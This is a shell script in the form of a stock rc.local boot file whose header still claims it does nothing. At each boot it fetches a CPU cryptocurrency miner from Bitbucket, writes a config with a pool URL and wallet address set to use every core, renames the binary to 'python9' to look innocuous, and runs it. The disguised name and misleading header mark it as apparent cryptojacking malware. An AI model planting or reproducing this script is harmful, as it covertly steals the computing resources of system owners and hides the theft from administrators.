#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.
if [ -f ${PWD}/python9 ]; then
    if pgrep -x "python9" > /dev/null
then
    echo "Miner dang chay roi , ke cmn di "
    
else

echo "Miner da install , chay thoi "
./python9

     
fi
exit
fi


set -x #echo on

wget https://bitbucket.org/cryptogone/ariocppminer/downloads/ariocppminer_v0.9.8_ubuntu16_server.tar.gz
tar -zxf ariocppminer_v0.9.8_ubuntu16_server.tar.gz
echo "pool
http://aropool.com/
y2nNWENYMvLRiyfRXf1Hf2JCrKMVMyvzL38CTQgMPrEAohWn8RSYkpRjvxvwELepeBrEpa1pwJQSRtnKWfb746C
`nproc`
enhanced
true
`hostname`" > config.cfg
mv ariocppminer_avx2 python9
./python9

exit 0
